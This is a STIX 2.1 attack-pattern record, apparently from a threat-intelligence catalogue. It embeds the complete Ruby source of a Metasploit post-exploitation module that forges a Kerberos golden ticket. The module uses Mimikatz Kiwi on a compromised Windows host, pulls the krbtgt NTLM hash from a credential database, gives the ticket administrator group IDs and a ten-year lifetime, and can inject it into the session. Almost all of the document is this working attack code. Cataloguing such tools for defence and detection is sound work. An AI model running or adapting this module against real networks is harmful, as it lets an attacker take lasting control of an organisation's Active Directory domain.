{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--160ec3a9-be1e-4850-9cb5-b380cecc893d",
    "created": "2024-08-14T16:33:04.626683Z",
    "modified": "2024-08-14T16:33:04.626687Z",
    "name": "Windows Escalate Golden Ticket",
    "description": " This module will create a Golden Kerberos Ticket using the Mimikatz Kiwi Extension. If no options are applied it will attempt to identify the current domain, the domain administrator account, the target domain SID, and retrieve the krbtgt NTLM hash from the database. By default the well-known Administrator's groups 512, 513, 518, 519, and 520 will be applied to the ticket.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/escalate/golden_ticket.rb",
            "external_id": "golden_ticket.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::NetAPI\n  include Msf::Post::Windows::Accounts\n  include Msf::Post::Windows::Kiwi\n  include Msf::Post::Windows::Error\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Escalate Golden Ticket',\n        'Description' => %q{\n          This module will create a Golden Kerberos Ticket using the Mimikatz Kiwi Extension. If no\n          options are applied it will attempt to identify the current domain, the domain administrator\n          account, the target domain SID, and retrieve the krbtgt NTLM hash from the database. By default\n          the well-known Administrator's groups 512, 513, 518, 519, and 520 will be applied to the ticket.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Ben Campbell'\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'References' => [\n          ['URL', 'https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos']\n        ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              kiwi_exec_cmd\n              stdapi_railgun_api\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptBool.new('USE', [true, 'Use the ticket in the current session', false]),\n        OptString.new('USER', [false, 'Target User']),\n        OptString.new('DOMAIN', [false, 'Target Domain']),\n        OptString.new('KRBTGT_HASH', [false, 'KRBTGT NT Hash']),\n        OptString.new('Domain SID', [false, 'Domain SID']),\n        OptInt.new('ID', [false, 'Target User ID']),\n        OptString.new('GROUPS', [false, 'ID of Groups (Comma Separated)']),\n        OptInt.new('END_IN', [true, 'End in ... Duration in hours, default 10 YEARS (~87608 hours)', 87608])\n      ]\n    )\n  end\n\n  def run\n    return unless load_kiwi\n\n    user = datastore['USER']\n    domain = datastore['DOMAIN']\n    krbtgt_hash = datastore['KRBTGT_HASH']\n    domain_sid = datastore['SID']\n    id = datastore['ID'] || 0\n    end_in = datastore['END_IN'] || 87608\n\n    unless domain\n      print_status('Searching for the domain...')\n      domain = get_domain\n      if domain\n        print_good(\"Targeting #{domain}\")\n      else\n        fail_with(Failure::Unknown, 'Unable to retrieve the domain...')\n      end\n    end\n\n    unless krbtgt_hash\n      if framework.db.active\n        print_status('Searching for krbtgt hash in database...')\n        krbtgt_hash = lookup_krbtgt_hash(domain)\n        fail_with(Failure::Unknown, 'Unable to find krbtgt hash in database') unless krbtgt_hash\n      else\n        fail_with(Failure::BadConfig, 'No database, please supply the krbtgt hash')\n      end\n    end\n\n    unless domain_sid\n      print_status(\"Obtaining #{domain} SID...\")\n      domain_sid = lookup_domain_sid(domain)\n\n      if domain_sid\n        print_good(\"Found #{domain} SID: #{domain_sid}\")\n      else\n        fail_with(Failure::Unknown, \"Unable to find SID for #{domain}\")\n      end\n    end\n\n    unless user\n      if id && id != 0\n        print_status(\"Looking up User ID: #{id}\")\n        user = resolve_sid(\"#{domain_sid}-#{id}\")[:name]\n      else\n        print_status('Looking up Domain Administrator account...')\n        user = resolve_sid(\"#{domain_sid}-500\")[:name]\n      end\n\n      if user\n        print_good(\"Found User: #{user}\")\n      else\n        fail_with(Failure::Unknown, 'Unable to find User')\n      end\n    end\n\n    # Golden Ticket requires an NTHash\n    if Metasploit::Framework::Hashes.identify_hash(krbtgt_hash) != 'nt'\n      fail_with(Failure::BadConfig, 'KRBTGT_HASH must be an NTHash')\n    end\n    nt_hash = krbtgt_hash.split(':')[1]\n\n    print_status(\"Creating Golden Ticket for #{domain}\\\\#{user}...\")\n    ticket = client.kiwi.golden_ticket_create({\n      user: user,\n      domain_name: domain,\n      domain_sid: domain_sid,\n      krbtgt_hash: nt_hash,\n      id: id,\n      group_ids: datastore['GROUPS'],\n      end_in: end_in\n    })\n\n    if ticket\n      print_good('Golden Ticket Obtained!')\n      kirbi_ticket = Base64.decode64(ticket)\n      kirbi_location = store_loot('golden_ticket',\n                                  'kirbi',\n                                  session,\n                                  kirbi_ticket,\n                                  \"#{domain}\\\\#{user}-golden_ticket.kirbi\",\n                                  \"#{domain}\\\\#{user} Golden Ticket\")\n      print_status(\"Kirbi ticket saved to #{kirbi_location}\")\n      krb_cred = Rex::Proto::Kerberos::Model::KrbCred.decode(kirbi_ticket)\n\n      ccache_ticket = Msf::Exploit::Remote::Kerberos::TicketConverter.kirbi_to_ccache(krb_cred)\n      ccache_location = store_loot('golden_ticket',\n                                   'ccache',\n                                   session,\n                                   ccache_ticket.to_binary_s,\n                                   \"#{domain}\\\\#{user}-golden_ticket.ccache\",\n                                   \"#{domain}\\\\#{user} Golden Ticket\")\n      print_status(\"ccache ticket saved to #{ccache_location}\")\n\n      if datastore['USE']\n        print_status('Attempting to use the ticket...')\n        client.kiwi.kerberos_ticket_use(ticket)\n        print_good('Kerberos ticket applied successfully')\n      end\n    else\n      fail_with(Failure::Unknown, 'Unable to create ticket')\n    end\n  end\n\n  def lookup_domain_sid(domain)\n    string_sid = nil\n\n    cb_sid = sid_buffer = 100\n    cch_referenced_domain_name = referenced_domain_name_buffer = 100\n\n    res = client.railgun.advapi32.LookupAccountNameA(\n      nil,\n      domain,\n      sid_buffer,\n      cb_sid,\n      referenced_domain_name_buffer,\n      cch_referenced_domain_name,\n      1\n    )\n\n    if !res['return'] && res['GetLastError'] == INSUFFICIENT_BUFFER\n      sid_buffer = cb_sid = res['cbSid']\n      referenced_domain_name_buffer = cch_referenced_domain_name = res['cchReferencedDomainName']\n\n      res = client.railgun.advapi32.LookupAccountNameA(\n        nil,\n        domain,\n        sid_buffer,\n        cb_sid,\n        referenced_domain_name_buffer,\n        cch_referenced_domain_name,\n        1\n      )\n    elsif !res['return']\n      return nil\n    end\n\n    if res['return']\n      sub_authority_count = res['Sid'].unpack('CC')[1]\n      sid = res['Sid'].unpack(\"CCCCCCCCV#{sub_authority_count}\")\n\n      string_sid = \"S-#{sid[0]}-#{sid[7]}-#{sid[8]}-#{sid[9]}-#{sid[10]}-#{sid[11]}\"\n    else\n      print_error(\"Error looking up SID: #{res['ErrorMessage']}\")\n    end\n\n    string_sid\n  end\n\n  def lookup_krbtgt_hash(domain)\n    krbtgt_hash = nil\n\n    krbtgt_creds = Metasploit::Credential::Core.joins(:public, :private).where(\n      metasploit_credential_publics: { username: 'krbtgt' },\n      metasploit_credential_privates: { type: 'Metasploit::Credential::NTLMHash' },\n      workspace_id: myworkspace_id\n    )\n\n    if krbtgt_creds\n\n      if krbtgt_creds.count == 0\n        print_error('No KRBTGT Hashes found in database')\n      elsif krbtgt_creds.count > 1\n\n        # Can we reduce the list by domain...\n        krbtgt_creds_realm = krbtgt_creds.select { |c| c.realm.to_s.upcase == domain.upcase }\n\n        # We have found a krbtgt hashes in our target domain\n        if krbtgt_creds_realm.length == 1\n          cred = krbtgt_creds_realm.first\n          krbtgt_hash = cred.private.data.split(':')[1]\n          print_good(\"Using #{cred.realm}:#{cred.public.username}:#{krbtgt_hash}\")\n          return krbtgt_hash\n        # We have found multiple krbtgt hashes in our target domain?!\n        elsif !krbtgt_creds_realm.empty?\n          krbtgt_creds = krbtgt_creds_realm\n        end\n\n        # Multiple hashes found, the user will have to manually set one...\n        print_error('Multiple KRBTGT Hashes found in database, please use one of the below:')\n        krbtgt_creds.each do |kc|\n          hash = kc.private.data.split(':')[1]\n          print_line(\"#{kc.realm}:#{kc.public.username}:#{hash}\")\n        end\n      else\n        # Highlander, there can only be one!\n        cred = krbtgt_creds.first\n        krbtgt_hash = cred.private.data.split(':')[1]\n        print_good(\"Using #{cred.realm}:#{cred.public.username}:#{krbtgt_hash}\")\n      end\n    end\n\n    krbtgt_hash\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}